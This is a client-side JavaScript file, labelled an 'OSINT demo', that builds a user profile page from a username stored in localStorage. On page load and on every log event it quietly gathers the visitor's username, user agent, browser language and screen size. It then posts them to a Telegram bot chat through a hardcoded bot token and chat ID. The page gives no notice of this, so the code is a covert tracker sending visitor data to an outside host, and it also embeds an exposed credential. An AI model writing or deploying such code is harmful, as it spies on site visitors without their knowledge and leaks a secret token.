const BOT_TOKEN = '7586619534:AAF6e4jBH2aEVIVGW9I5Fdze--3pmXnja60';
const CHAT_ID = '7408565938';

const logArea = document.getElementById('logArea');
const userDataList = document.getElementById('userDataList');
const profileForm = document.getElementById('profileForm');

let currentUser = null;
let logs = [];

// Функция для добавления логов и отображения их на странице
function addLog(text) {
  const time = new Date().toLocaleTimeString();
  const logEntry = `[${time}] ${text}`;
  logs.push(logEntry);
  if (logArea) {
    logArea.textContent = logs.join('\n');
  }
  sendToTelegram({ message: text });
}

// Отправка сообщения в Telegram через Bot API
async function sendToTelegram(data) {
  let msg = `🕵️ OSINT Demo Log:\n`;
  if (data.message) msg += `• Событие: ${data.message}\n`;
  if (data.ip) msg += `• IP: ${data.ip}\n`;
  if (data.userAgent) msg += `• User-Agent: ${data.userAgent}\n`;
  if (data.language) msg += `• Язык: ${data.language}\n`;
  if (data.screen) msg += `• Экран: ${data.screen}\n`;
  if (data.username) msg += `• Пользователь: ${data.username}\n`;
  if (data.extra) msg += `• Дополнительно: ${data.extra}\n`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
    });
  } catch (e) {
    console.warn('Ошибка отправки в Telegram', e);
  }
}

// Регистрация / авторизация пользователя (через localStorage)
function registerUser(username) {
  currentUser = { username };
  localStorage.setItem('osintDemoUser', JSON.stringify(currentUser));
  addLog(`Пользователь зарегистрирован: ${username}`);
  renderUserProfile();
}

// Загрузка данных пользователя из localStorage
function loadUser() {
  const stored = localStorage.getItem('osintDemoUser');
  if (stored) {
    currentUser = JSON.parse(stored);
    addLog(`Пользователь загружен: ${currentUser.username}`);
  }
}

// Отобразить профиль пользователя и данные окружения
function renderUserProfile() {
  if (!currentUser) return;
  if (profileForm) profileForm.username.value = currentUser.username;

  if (!userDataList) return;

  const ua = navigator.userAgent;
  const lang = navigator.language;
  const screenSize = `${window.screen.width}x${window.screen.height}`;

  userDataList.innerHTML = `
    <li><b>Имя пользователя:</b> ${currentUser.username}</li>
    <li><b>User-Agent:</b> ${ua}</li>
    <li><b>Язык браузера:</b> ${lang}</li>
    <li><b>Размер экрана:</b> ${screenSize}</li>
  `;

  // Отправка логов при загрузке
  sendToTelegram({
    message: "Профиль пользователя загружен",
    username: currentUser.username,
    userAgent: ua,
    language: lang,
    screen: screenSize,
  });
}

// Обработчик формы профиля
if (profileForm) {
  profileForm.addEventListener('submit', e => {
    e.preventDefault();
    const username = profileForm.username.value.trim();
    if (username.length < 3) {
      alert('Введите имя пользователя не менее 3 символов');
      return;
    }
    registerUser(username);
  });
}

// При загрузке страницы
window.addEventListener('load', () => {
  loadUser();
  if (!currentUser) {
    alert('Пожалуйста, зарегистрируйтесь, чтобы продолжить.');
    window.location.href = 'index.html';
  } else {
    renderUserProfile();
    addLog('Пользователь на странице профиля');
  }
});
